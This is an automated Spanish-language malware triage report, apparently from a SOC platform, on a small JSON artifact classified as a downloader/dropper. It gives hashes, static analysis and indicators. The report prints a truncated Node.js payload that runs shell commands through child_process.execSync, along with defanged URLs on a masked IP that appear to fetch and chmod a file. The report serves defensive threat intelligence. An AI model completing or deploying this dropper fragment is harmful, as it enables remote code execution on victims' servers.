# 🧬 Payload Analysis

`503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:23:38+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4`
- **SHA1:** `40afc7f5948848c867cc68242403fb5907afe0a1`
- **MD5:** `7e7aed6ce821760415500f8d5a8f57d2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 896 B |
| Entropía | 5.15 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp||cd /var/run||cd /m
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 192.142.28.XXX | static_analysis |
| url | hxxp://192.142.28.XXX/cumshotnews;chmod | strings |
| url | hxxp://192.142.28.XXX/cumshotnews;curl | strings |
| hash | 503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4 | static_analysis |
| command | {"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp\|\|cd /var/run\|\|cd /m | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
